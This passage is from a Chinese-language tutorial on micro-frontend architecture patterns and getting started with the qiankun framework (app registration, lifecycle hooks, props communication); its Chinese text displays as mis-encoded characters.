<pre><code class="hljs language-css" lang="css">å›¢é˜Ÿ<span class="hljs-selector-tag">A</span>ï¼ˆReactä¸“å®¶ï¼‰ â†’ è´Ÿè´£ç”µå•†å•†å“æ¨¡å—
å›¢é˜Ÿ<span class="hljs-selector-tag">B</span>ï¼ˆVueä¸“å®¶ï¼‰   â†’ è´Ÿè´£è´­ç‰©è½¦æ¨¡å—
å›¢é˜ŸCï¼ˆAngularä¸“å®¶ï¼‰â†’ è´Ÿè´£ç”¨æˆ·ä¸­å¿ƒ
ä¸»åº”ç”¨åè°ƒæ‰€æœ‰æ¨¡å—
</code></pre>
<p>ä¸­åå°ç³»ç»Ÿï¼šå¤æ‚ç³»ç»Ÿçš„åŠŸèƒ½æ‹†åˆ†</p>
<pre><code class="hljs language-diff" lang="diff">ä¸€ä¸ªåå°ç®¡ç†ç³»ç»ŸåŒ…å«ï¼š
<span class="hljs-deletion">- æƒé™ç®¡ç†ï¼ˆReactï¼‰</span>
<span class="hljs-deletion">- æ•°æ®æŠ¥è¡¨ï¼ˆVue + EChartsï¼‰</span>
<span class="hljs-deletion">- å·¥ä½œæµï¼ˆAngularï¼‰</span>
<span class="hljs-deletion">- ç›‘æ§é¢æ¿ï¼ˆReact + Three.jsï¼‰</span>
</code></pre>
<h2 data-id="heading-5">å››ç§æ¶æ„æ¨¡å¼</h2>
<h3 data-id="heading-6">åŸºåº§æ¨¡å¼ï¼ˆä¹Ÿç§°ä¸ºä¸­å¿ƒåŒ–è·¯ç”±æ¨¡å¼ï¼‰</h3>
<ul>
<li>åŸºåº§æ¨¡å¼æ˜¯æœ€å¸¸è§çš„å¾®å‰ç«¯æ¶æ„ã€‚å®ƒæœ‰ä¸€ä¸ªä¸»åº”ç”¨ï¼ˆé€šå¸¸ç§°ä¸ºåŸºåº§æˆ–å®¹å™¨ï¼‰ï¼Œè´Ÿè´£æ•´ä¸ªåº”ç”¨çš„å¸ƒå±€ã€è·¯ç”±å’Œå…¬å…±é€»è¾‘ã€‚å­åº”ç”¨æ ¹æ®è·¯ç”±è¢«åŠ¨æ€åŠ è½½å’Œå¸è½½ã€‚</li>
</ul>

<pre><code class="hljs language-scss" lang="scss">  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚            ä¸»åº”ç”¨ï¼ˆContainerï¼‰           â”‚
  â”‚ è´Ÿè´£ï¼šè·¯ç”±ã€é‰´æƒã€å¸ƒå±€ã€å…±äº«çŠ¶æ€ã€å…¬å…±ä¾èµ–   â”‚
  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” 
  â”‚  â”‚ å­åº”ç”¨<span class="hljs-selector-tag">A</span>  â”‚  â”‚ å­åº”ç”¨<span class="hljs-selector-tag">B</span>  â”‚  â”‚ å­åº”ç”¨C  â”‚ â”‚
  â”‚  â”‚ (React)  â”‚  â”‚  (Vue)   â”‚  â”‚(Angular) â”‚ 
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ 
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h4 data-id="heading-7">å·¥ä½œæµç¨‹</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
ç”¨æˆ·è®¿é—®ä¸»åº”ç”¨--&gt;ä¸»åº”ç”¨æ ¹æ®å½“å‰URLåŒ¹é…å­åº”ç”¨--&gt; A["åŠ è½½å¯¹åº”å­åº”ç”¨çš„èµ„æºï¼ˆJSã€CSSï¼‰"]--&gt;å°†å­åº”ç”¨æ¸²æŸ“åˆ°æŒ‡å®šå®¹å™¨ä¸­--&gt;å­åº”ç”¨è¿è¡Œå¹¶å¤„ç†è‡ªå·±çš„å†…éƒ¨è·¯ç”±å’Œé€»è¾‘
</code></pre>
<h4 data-id="heading-8">ä¼˜ç‚¹</h4>
<ul>
<li>é›†ä¸­æ§åˆ¶ï¼Œæ˜“äºç®¡ç†</li>
<li>è·¯ç”±é€»è¾‘æ¸…æ™°</li>
<li>å…¬å…±ä¾èµ–å®¹æ˜“å¤„ç†ï¼ˆåŸºåº§å¯æä¾›å…±äº«åº“ï¼‰</li>
<li>å­åº”ç”¨é—´éš”ç¦»æ€§å¥½</li>
</ul>
<h4 data-id="heading-9">ç¼ºç‚¹</h4>
<ul>
<li>ä¸»åº”ç”¨æˆä¸ºå•ç‚¹æ•…éšœ</li>
<li>åŸºåº§å’Œå­åº”ç”¨è€¦åˆï¼ˆé€šè¿‡åè®®é€šä¿¡ï¼‰</li>
<li>åŸºåº§éœ€è¦çŸ¥é“æ‰€æœ‰å­åº”ç”¨çš„ä¿¡æ¯</li>
</ul>
<h4 data-id="heading-10">é€‚ç”¨åœºæ™¯</h4>
<ul>
<li>ä¼ä¸šçº§ä¸­åå°ç³»ç»Ÿ</li>
<li>éœ€è¦ç»Ÿä¸€å¯¼èˆªå’Œå¸ƒå±€çš„åº”ç”¨</li>
<li>å­åº”ç”¨æŠ€æœ¯æ ˆå·®å¼‚å¤§</li>
</ul>
<h3 data-id="heading-11">è‡ªç»„ç»‡æ¨¡å¼ï¼ˆä¹Ÿç§°ä¸ºå»ä¸­å¿ƒåŒ–æ¨¡å¼ï¼‰</h3>
<ul>
<li>åœ¨è‡ªç»„ç»‡æ¨¡å¼ä¸­ï¼Œæ²¡æœ‰ä¸­å¿ƒåŒ–çš„åŸºåº§ã€‚æ¯ä¸ªå¾®å‰ç«¯åº”ç”¨éƒ½æ˜¯ç‹¬ç«‹çš„ï¼Œå®ƒä»¬é€šè¿‡æŸç§é€šä¿¡æœºåˆ¶ï¼ˆå¦‚è‡ªå®šä¹‰äº‹ä»¶ã€æ¶ˆæ¯æ€»çº¿ï¼‰æ¥åè°ƒã€‚é€šå¸¸ï¼Œæ¯ä¸ªåº”ç”¨éƒ½å¯ä»¥åŠ¨æ€å‘ç°å’ŒåŠ è½½å…¶ä»–åº”ç”¨ã€‚</li>
</ul>

<pre><code class="hljs language-scss" lang="scss">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  åº”ç”¨<span class="hljs-selector-tag">A</span>   â”‚     â”‚  åº”ç”¨<span class="hljs-selector-tag">B</span>   â”‚    â”‚  åº”ç”¨C    â”‚
â”‚ (React)  â”‚    â”‚  (Vue)   â”‚    â”‚(Angular) â”‚
â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”˜
     â”‚               â”‚               â”‚
     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                     â”‚
            â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
            â”‚  è¿è¡Œæ—¶åè°ƒå™¨     â”‚
            â”‚  (Runtime Bus)   â”‚
            â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
1["åº”ç”¨Aå¯åŠ¨ï¼Œå¹¶æ³¨å†Œåˆ°æ¶ˆæ¯æ€»çº¿"]
--&gt;2["åº”ç”¨Bå¯åŠ¨ï¼Œå¹¶æ³¨å†Œåˆ°æ¶ˆæ¯æ€»çº¿"]
--&gt;ç”¨æˆ·æ“ä½œè§¦å‘åº”ç”¨Aéœ€è¦åº”ç”¨Bçš„æŸä¸ªåŠŸèƒ½
--&gt;åº”ç”¨Aé€šè¿‡æ¶ˆæ¯æ€»çº¿è¯·æ±‚åº”ç”¨Bçš„èµ„æº
--&gt;3["åº”ç”¨Bå“åº”è¯·æ±‚ï¼Œæä¾›èµ„æºï¼ˆæˆ–ç›´æ¥æ¸²æŸ“ï¼‰"]
</code></pre>
<h4 data-id="heading-12">ä¼˜ç‚¹</h4>
<ul>
<li>å»ä¸­å¿ƒåŒ–ï¼Œé¿å…å•ç‚¹æ•…éšœ</li>
<li>åº”ç”¨ä¹‹é—´å®Œå…¨è§£è€¦</li>
<li>æ›´çµæ´»çš„é€šä¿¡æ–¹å¼</li>
</ul>
<h4 data-id="heading-13">ç¼ºç‚¹</h4>
<ul>
<li>é€šä¿¡å¤æ‚ï¼Œå®¹æ˜“æ··ä¹±</li>
<li>éš¾ä»¥ç»Ÿä¸€ç®¡ç†ï¼ˆå¦‚è·¯ç”±ã€æƒé™ï¼‰</li>
<li>ä¾èµ–å…¬å…±åè®®ï¼Œç‰ˆæœ¬æ›´æ–°å¯èƒ½ç ´åé€šä¿¡</li>
</ul>
<h4 data-id="heading-14">é€‚ç”¨åœºæ™¯</h4>
<ul>
<li>é«˜åº¦è‡ªæ²»çš„å›¢é˜Ÿ</li>
<li>åº”ç”¨é—´åŠŸèƒ½ç›¸å¯¹ç‹¬ç«‹</li>
<li>éœ€è¦åŠ¨æ€ç»„åˆçš„é¡µé¢</li>
</ul>
<h3 data-id="heading-15">å¾®ä»¶æ¨¡å¼ï¼ˆä¹Ÿç§°ä¸ºç»„åˆå¼æ¨¡å¼ï¼‰</h3>
<ul>
<li>å¾®ä»¶æ¨¡å¼ç±»ä¼¼äºä¼ ç»Ÿé—¨æˆ·ç½‘ç«™ï¼Œé¡µé¢ç”±å¤šä¸ªç‹¬ç«‹çš„å¾®ä»¶ï¼ˆWidgetï¼‰ç»„æˆã€‚æ¯ä¸ªå¾®ä»¶éƒ½æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„å¾®å‰ç«¯åº”ç”¨ï¼Œå¯ä»¥ç‹¬ç«‹å¼€å‘ã€éƒ¨ç½²ï¼Œç„¶ååŠ¨æ€ç»„åˆåˆ°é¡µé¢ä¸­ã€‚</li>
</ul>

<pre><code class="hljs">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚          Dashboardé¡µé¢            â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”‚
â”‚  â”‚ å¤©æ°”    â”‚ æ–°é—»   â”‚ è‚¡ç¥¨    â”‚     â”‚
â”‚  â”‚ Widget â”‚ Widget â”‚ Widget  â”‚    â”‚
â”‚  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤    â”‚
â”‚  â”‚ å¾…åŠ    â”‚ æ—¥å†   â”‚ é‚®ä»¶    â”‚     â”‚
â”‚  â”‚ Widget â”‚ Widget â”‚ Widget  â”‚    â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
ç”¨æˆ·è®¿é—®é¡µé¢
    --&gt;
é¡µé¢å¸ƒå±€å¼•æ“æ ¹æ®é…ç½®åŠ è½½å¾®ä»¶
    --&gt;
æ¯ä¸ªå¾®ä»¶ç‹¬ç«‹åŠ è½½èµ„æºå¹¶æ¸²æŸ“
    --&gt;
å¾®ä»¶ä¹‹é—´é€šè¿‡é¢„å®šä¹‰çš„æ¥å£é€šä¿¡
</code></pre>
<h4 data-id="heading-16"><strong>ä¼˜ç‚¹</strong>ï¼š</h4>
<ul>
<li>ç»„ä»¶å¯ä»¥å¤ç”¨</li>
<li>ç”¨æˆ·å¯ä»¥è‡ªå®šä¹‰å¸ƒå±€</li>
<li>æ‰€æœ‰widgetåœ¨åŒä¸€ä¸ªé¡µé¢</li>
<li>å¯ä»¥æŒ‰éœ€åŠ è½½widget</li>
</ul>
<h4 data-id="heading-17"><strong>ç¼ºç‚¹</strong>ï¼š</h4>
<ul>
<li>æ ·å¼ç®¡ç†å¤æ‚ï¼Œéœ€è¦å¤„ç†widgeté—´æ ·å¼å†²çª</li>
<li>é€šä¿¡é™åˆ¶ï¼Œwidgeté—´é€šä¿¡éœ€è¦ç»è¿‡ä¸»åº”ç”¨</li>
<li>ç‰ˆæœ¬ç®¡ç†ï¼Œå¤§é‡widgetçš„ç‰ˆæœ¬ç®¡ç†å›°éš¾</li>
<li>æ€§èƒ½é—®é¢˜ï¼Œå¤ªå¤šwidgetå¯èƒ½å½±å“æ€§èƒ½</li>
</ul>
<h4 data-id="heading-18"><strong>é€‚ç”¨åœºæ™¯</strong>ï¼š</h4>
<ol>
<li>æ•°æ®å¯è§†åŒ–å¤§å±</li>
<li>é—¨æˆ·ç½‘ç«™é¦–é¡µ</li>
<li>ä¸ªäººå·¥ä½œå°</li>
<li>å¯é…ç½®çš„ç®¡ç†åå°</li>
</ol>
<h3 data-id="heading-19">æ··åˆæ¨¡å¼ï¼ˆå®æˆ˜ä¸­æœ€å¸¸è§ï¼‰</h3>
<ul>
<li>åœ¨å®é™…é¡¹ç›®ä¸­ï¼Œæˆ‘ä»¬å¸¸å¸¸æ ¹æ®éœ€æ±‚æ··åˆä½¿ç”¨ä»¥ä¸Šæ¨¡å¼ã€‚ä¾‹å¦‚ï¼Œåœ¨åŸºåº§æ¨¡å¼ä¸­ï¼ŒæŸä¸ªå­åº”ç”¨å†…éƒ¨ä½¿ç”¨å¾®ä»¶æ¨¡å¼æ¥ç»„åˆå¤šä¸ªå¾®å‰ç«¯æ¨¡å—ã€‚</li>
<li>æ¯”å¦‚ä¸€ä¸ªç”µå•†ç³»ç»Ÿçš„æ¶æ„</li>
</ul>

<pre><code class="hljs language-css" lang="css">ä¸»åº”ç”¨ï¼ˆåŸºåº§æ¨¡å¼ï¼‰
    â”œâ”€â”€ å•†å“ç®¡ç†ï¼ˆReactå­åº”ç”¨ï¼‰
    â”œâ”€â”€ è®¢å•ç®¡ç†ï¼ˆVueå­åº”ç”¨ï¼‰
    â””â”€â”€ ç”¨æˆ·ç®¡ç†ï¼ˆAngularå­åº”ç”¨ï¼‰
        åœ¨ç”¨æˆ·ç®¡ç†å†…éƒ¨ï¼Œä½¿ç”¨å¾®ä»¶æ¨¡å¼ï¼š
            â”œâ”€â”€ ç”¨æˆ·ç»Ÿè®¡ï¼ˆå¾®ä»¶<span class="hljs-selector-tag">A</span>ï¼‰
            â”œâ”€â”€ ç”¨æˆ·åˆ—è¡¨ï¼ˆå¾®ä»¶<span class="hljs-selector-tag">B</span>ï¼‰
            â””â”€â”€ ç”¨æˆ·æƒé™ï¼ˆå¾®ä»¶Cï¼‰
</code></pre>

<pre><code class="hljs language-scss" lang="scss">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                ä¸»åº”ç”¨ï¼ˆåŸºåº§æ¨¡å¼ï¼‰                 â”‚
â”‚   ç»Ÿä¸€è·¯ç”±ã€æƒé™ã€ç”¨æˆ·ä¸­å¿ƒã€æ¶ˆæ¯ä¸­å¿ƒã€å…¨å±€çŠ¶æ€       â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                  â”‚
    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
    â”‚             â”‚             â”‚
â”Œâ”€â”€â”€â–¼â”€â”€â”€â”   â”Œâ”€â”€â”€â”€â–¼â”€â”€â”€â”€â”   â”Œâ”€â”€â”€â”€â–¼â”€â”€â”€â”€â”
â”‚è®¢å•ä¸­å¿ƒâ”‚   â”‚å•†å“ç®¡ç† â”‚   â”‚ç”¨æˆ·ç®¡ç†   â”‚
â”‚(React)â”‚   â”‚ (Vue)   â”‚   â”‚(Angular)â”‚
â””â”€â”€â”€â”¬â”€â”€â”€â”˜   â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”˜   â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”˜
    â”‚            â”‚             â”‚
    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                 â”‚
          â”Œâ”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”
          â”‚ æ•°æ®åˆ†ææ¨¡å— â”‚
          â”‚ (å¾®ä»¶æ¨¡å¼)   â”‚
          â”‚â”Œâ”€â”€â”€â”¬â”€â”€â”€â”¬â”€â”€â”€â”â”‚
          â”‚â”‚å›¾è¡¨â”‚åœ°å›¾â”‚æŠ¥è¡¨â”‚
          â”‚â””â”€â”€â”€â”´â”€â”€â”€â”´â”€â”€â”€â”˜â”‚
</code></pre>
<h2 data-id="heading-20">å¿«é€Ÿä¸Šæ‰‹</h2>
<ul>
<li>æ–°å»ºä¸‰ä¸ªé¡¹ç›®ï¼Œåˆ†åˆ«ä¸º<code>main-app,sub-app1,sub-app2</code>ï¼Œé¡¹ç›®ç»“æ„ä¸€ç›®äº†ç„¶ï¼š</li>
</ul>

<pre><code class="hljs language-less" lang="less">   â”œâ”€â”€ <span class="hljs-selector-tag">main</span><span class="hljs-selector-tag">-app</span>/      <span class="hljs-comment">// ä¸»åº”ç”¨ï¼ˆåŸºåº§ï¼‰</span>
   â”œâ”€â”€ <span class="hljs-selector-tag">sub-app1</span>/      <span class="hljs-comment">// vue3å­åº”ç”¨ï¼ˆå›¢é˜ŸAï¼‰</span>
   â”œâ”€â”€ <span class="hljs-selector-tag">app-vue</span>/        <span class="hljs-comment">// vue3å­åº”ç”¨ï¼ˆå›¢é˜ŸBï¼‰</span>
</code></pre>
<h3 data-id="heading-21">å®‰è£…qiankun</h3>
<pre><code class="hljs language-shell" lang="shell">yarn add qiankun # æˆ–è€… npm i qiankun -S
</code></pre>
<h3 data-id="heading-22">ä¸»é¡¹ç›®ä¸­æ³¨å†Œå¾®åº”ç”¨</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// ä¸»åº”ç”¨main-app/main.js</span>
<span class="hljs-keyword">import</span> { createApp } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'./style.css'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./App.vue'</span>
<span class="hljs-keyword">import</span> { registerMicroApps, start } <span class="hljs-keyword">from</span> <span class="hljs-string">'qiankun'</span>

<span class="hljs-title function_">createApp</span>(<span class="hljs-title class_">App</span>).<span class="hljs-title function_">mount</span>(<span class="hljs-string">'#app1'</span>)

<span class="hljs-title function_">registerMicroApps</span>(
  [
    {
      <span class="hljs-attr">name</span>: <span class="hljs-string">'sub-app1'</span>, <span class="hljs-comment">// app name registered</span>
      <span class="hljs-attr">entry</span>: <span class="hljs-string">'http://localhost:5175'</span>,
      <span class="hljs-attr">container</span>: <span class="hljs-string">'#micro-app-container'</span>,
      <span class="hljs-attr">activeRule</span>: <span class="hljs-function">(<span class="hljs-params">location</span>) =&gt;</span> location.<span class="hljs-property">hash</span>.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'#/app-a'</span>),
      <span class="hljs-attr">props</span>: {
        <span class="hljs-attr">name</span>: <span class="hljs-string">'kuitos'</span>
      }
    }
  ],
  {
    <span class="hljs-attr">beforeLoad</span>: <span class="hljs-function">(<span class="hljs-params">app</span>) =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'before load'</span>, app.<span class="hljs-property">name</span>),
    <span class="hljs-attr">beforeMount</span>: [<span class="hljs-function">(<span class="hljs-params">app</span>) =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'before mount'</span>, app.<span class="hljs-property">name</span>)]
  }
)
<span class="hljs-comment">// start()</span>

<span class="hljs-comment">// å¯åŠ¨ qiankunï¼Œé…ç½®æ²™ç®±æ¨¡å¼</span>
<span class="hljs-title function_">start</span>({
  <span class="hljs-attr">sandbox</span>: {
    <span class="hljs-attr">strictStyleIsolation</span>: <span class="hljs-literal">true</span>,
  },
})

</code></pre>
<h3 data-id="heading-23">å¾®åº”ç”¨å¯¼å‡ºé’©å­</h3>
<ul>
<li>ç”±äº<code>qiankun</code>ä¸æ”¯æŒmoduleï¼Œæ‰€ä»¥å¯¹äºvue3é¡¹ç›®ï¼Œéœ€è¦ä½¿ç”¨<code>vite-plugin-qiankun</code>æ¥é›†æˆ</li>
<li><code>renderWithQiankun</code>ç”¨æ¥å¯¹å¤–æš´éœ²é’©å­</li>
<li><code>qiankunWindow</code>æ›¿ä»£<code>window</code>å˜é‡</li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// å­åº”ç”¨ sub-app1/mian.js</span>
<span class="hljs-keyword">import</span> { createApp } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> {
  renderWithQiankun,
  qiankunWindow
} <span class="hljs-keyword">from</span> <span class="hljs-string">'vite-plugin-qiankun/dist/helper'</span>

<span class="hljs-keyword">import</span> <span class="hljs-string">'./style.css'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./App.vue'</span>
<span class="hljs-keyword">let</span> instance = <span class="hljs-literal">null</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">render</span>(<span class="hljs-params">props = {}</span>) {
  <span class="hljs-keyword">const</span> container = props.<span class="hljs-property">container</span> || <span class="hljs-string">'#app'</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å­åº”ç”¨æŒ‚è½½å®¹å™¨ï¼š'</span>, container)

  instance = <span class="hljs-title function_">createApp</span>(<span class="hljs-title class_">App</span>)
  instance.<span class="hljs-title function_">mount</span>(container)
}
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'qiankunWindow'</span>,qiankunWindow);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'window.__POWERED_BY_QIANKUN__'</span>,<span class="hljs-variable language_">window</span>.<span class="hljs-property">__POWERED_BY_QIANKUN__</span>);

<span class="hljs-comment">// ç‹¬ç«‹è¿è¡Œæ—¶ï¼Œç›´æ¥æ¸²æŸ“</span>
<span class="hljs-keyword">if</span> (!qiankunWindow.<span class="hljs-property">__POWERED_BY_QIANKUN__</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'ç‹¬ç«‹è¿è¡Œæ—¶ï¼Œç›´æ¥æ¸²æŸ“'</span>)
  <span class="hljs-title function_">render</span>()
}

<span class="hljs-title function_">renderWithQiankun</span>({
  <span class="hljs-title function_">mount</span>(<span class="hljs-params">props</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(props)
    <span class="hljs-title function_">render</span>(props)
  },
  <span class="hljs-title function_">bootstrap</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'bootstrap'</span>)
  },
  <span class="hljs-title function_">unmount</span>(<span class="hljs-params">props</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'unmount'</span>, props)
  },
  <span class="hljs-title function_">update</span>(<span class="hljs-params">props</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'update'</span>, props)
  }
})

</code></pre>
<p>åœ¨å­åº”ç”¨çš„<code>vite.config.js</code>ä¸­æ³¨å†Œæ’ä»¶</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// å­åº”ç”¨ sub-app1/vite.config.js</span>
<span class="hljs-attr">plugins</span>: [
    <span class="hljs-title function_">vue</span>(),
    <span class="hljs-title function_">qiankun</span>(<span class="hljs-string">'sub-app1'</span>, {
      <span class="hljs-attr">useDevMode</span>: <span class="hljs-literal">true</span>,
    })
],
</code></pre>
<h2 data-id="heading-24">è¿›é˜¶åœºæ™¯</h2>
<h3 data-id="heading-25">åº”ç”¨é€šä¿¡</h3>
<p>åº”ç”¨æ‹†åˆ†åï¼Œä¸å¯é¿å…çš„ä¼šæ¶‰åŠåˆ°é€šä¿¡é—®é¢˜ï¼Œé‚£ä¹ˆå¦‚ä½•è®©å®ƒä»¬â€œæ„‰å¿«åœ°å¯¹è¯â€ï¼Ÿ</p>
<h4 data-id="heading-26"><strong>props</strong></h4>
<ul>
<li>æœ€ç®€å•çš„æ–¹å¼ï¼Œæ­£å¦‚ç›®å‰çš„ä¸»æµæ¡†æ¶ï¼Œ<code>qiankun</code>ä¹Ÿæä¾›äº†ä¸€ä¸ª<code>props</code>å±æ€§ï¼Œå¯ä»¥å®ç°<code>çˆ¶-&gt;å­</code>ä¹‹é—´çš„æ•°æ®é€šä¿¡ï¼Œå½“ä¸»åº”ç”¨æ³¨å†Œ<code>registerMicroApps</code>å­åº”ç”¨çš„æ—¶å€™ï¼Œåˆ©ç”¨<code>props</code>ä¼ é€’</li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// ä¸»åº”ç”¨ main-app/main.js</span>
<span class="hljs-title function_">registerMicroApps</span>(
  [
    {
      <span class="hljs-attr">name</span>: <span class="hljs-string">'sub-app1'</span>, <span class="hljs-comment">// app name registered</span>
      <span class="hljs-attr">entry</span>: <span class="hljs-string">'http://localhost:5175'</span>,
      <span class="hljs-attr">container</span>: <span class="hljs-string">'#micro-app-container'</span>,
      <span class="hljs-attr">activeRule</span>: <span class="hljs-function">(<span class="hljs-params">location</span>) =&gt;</span> location.<span class="hljs-property">hash</span>.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'#/app-a'</span>),
      <span class="hljs-attr">props</span>: {
        <span class="hljs-comment">// name: 'kuitos' //è¯¥å±æ€§ä¼šè¢«è¦†ç›–ï¼Ÿ</span>
        <span class="hljs-attr">count</span>: <span class="hljs-number">100</span>,
        <span class="hljs-attr">time</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">getTime</span>()
      }
    }
  ],
  {
    <span class="hljs-attr">beforeLoad</span>: <span class="hljs-function">(<span class="hljs-params">app</span>) =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'before load'</span>, app.<span class="hljs-property">name</span>),
    <span class="hljs-attr">beforeMount</span>: [<span class="hljs-function">(<span class="hljs-params">app</span>) =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'before mount'</span>, app.<span class="hljs-property">name</span>)]
  }
)

</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// å­åº”ç”¨ sub-app1/main.js</span>
<span class="hljs-title function_">renderWithQiankun</span>({
  <span class="hljs-title function_">mount</span>(<span class="hljs-params">props</span>) {
    <span class="hljs-title function_">render</span>(props)
  },
})
</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// å­åº”ç”¨ sub-app1/main.js</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">render</span>(<span class="hljs-params">props = {}</span>) {
  <span class="hljs-keyword">const</span> container = props.<span class="hljs-property">container</span> || <span class="hljs-string">'#app'</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å­åº”ç”¨æŒ‚è½½å®¹å™¨ï¼š'</span>, container)

  instance = <span class="hljs-title function_">createApp</span>(<span class="hljs-title class_">App</span>)
